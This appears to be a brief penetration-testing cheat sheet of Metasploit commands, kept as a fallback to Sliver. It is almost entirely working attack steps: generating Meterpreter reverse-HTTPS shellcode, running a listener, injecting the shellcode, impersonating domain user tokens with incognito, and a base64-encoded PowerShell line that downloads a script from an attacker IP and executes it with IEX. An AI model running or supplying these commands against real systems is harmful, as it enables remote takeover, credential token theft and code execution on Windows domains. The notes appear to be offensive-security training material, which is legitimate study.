# Metasploit

Just in case Sliver fails

### 1) Metasploit - x64 shellcode

    sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 EXITFUNC=thread -f raw -o /home/kali/OSEP/hav0c/metasploit.x64.bin


### 2) Listener - msfconsole

    sudo msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set lhost tun0;set lport 443; set exitfunc thread; set EnableStageEncoding true; set exitonsession false; run -j'


### 3) Execute metasploit.x64.bin to get within msf

    execute-shellcode -S -r -I 30 /home/kali/OSEP/hav0c/metasploit.x64.bin


### 4) Within msf

    load incognito


### 5) List users

    list_tokens -u

### 6) Impersonate

    impersonate_token domain\\user

### 7) Get shell as the impersonated user

    shell
    powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA==


    # Sliver
    # We get the shell back as domain\user and can continue to enumerate
